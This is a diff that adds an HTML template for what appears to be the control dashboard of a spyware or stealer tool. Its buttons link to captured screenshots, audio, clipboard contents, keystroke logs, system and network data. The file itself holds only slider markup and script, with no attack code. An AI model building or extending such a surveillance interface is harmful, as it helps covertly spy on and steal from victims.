@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Background Logger</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+    <link rel="preload" href="{{ url_for('static', filename='fonts/Darknet.ttf') }}" as="font" type="font/ttf" crossorigin>
+    <link rel="icon" href="static/NoctisX1.png" type="image/png">
+    <link rel="shortcut icon" href="static/NoctisX1.png" type="image/png">
+</head>
+<body>
+    <div class="container">
+        <!-- Heading with Darknet Font and Pulsing Effect -->
+        <h1>Background Logger Dashboard</h1>
+        <p>Click below to view or download logs.</p>
+        
+        <!-- Slider Container -->
+        <div class="slider">
+            <div class="slider-track">
+                <div class="slide">
+                    <img src="{{ url_for('static', filename='SSS.jpg') }}" alt="mp4">
+                    <a href="/screenshot" class="button">View Screenshot</a>
+                </div>
+                <div class="slide">
+                    <img src="{{ url_for('static', filename='AUDIO.jpg') }}" alt="Audio">
+                    <a href="/download_audio" class="button">Download Audio</a>
+                </div>
+                <div class="slide">
+                    <img src="{{ url_for('static', filename='SYS.jpg') }}" alt="System Info">
+                    <a href="/system_info" class="button">View System Info</a>
+                </div>
+                <div class="slide">
+                    <img src="{{ url_for('static', filename='HACKED.jpg') }}" alt="Clipboard">
+                    <a href="/clipboard" class="button">View Clipboard Logs</a>
+                </div>
+                <div class="slide">
+                    <img src="{{ url_for('static', filename='BEHAVE.jpg') }}" alt="Behavior">
+                    <a href="/behavior" class="button">View Behavior Data</a>
+                </div>
+                <div class="slide">
+                    <img src="{{ url_for('static', filename='KEY.jpg') }}" alt="Key Logs">
+                    <a href="/keylog" class="button">View Key Logs</a>
+                </div>
+                <div class="slide">
+                    <img src="{{ url_for('static', filename='NW.jpg') }}" alt="Network Logs">
+                    <a href="/network" class="button">View Network Logs</a>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Navigation Buttons -->
+        <div class="slider-nav">
+            <button class="prev">Previous</button>
+            <button class="next">Next</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const sliderTrack = document.querySelector('.slider-track');
+            const prevButton = document.querySelector('.prev');
+            const nextButton = document.querySelector('.next');
+            let currentIndex = 0;
+
+            const totalSlides = document.querySelectorAll('.slide').length;
+
+            prevButton.addEventListener('click', () => {
+                if (currentIndex > 0) {
+                    currentIndex--;
+                    updateSlider();
+                }
+            });
+
+            nextButton.addEventListener('click', () => {
+                if (currentIndex < totalSlides - 1) {
+                    currentIndex++;
+                    updateSlider();
+                }
+            });
+
+            function updateSlider() {
+                const offset = -currentIndex * 100;
+                sliderTrack.style.transform = `translateX(${offset}%)`;
+            }
+        });
+    </script>
+</body>
+</html>
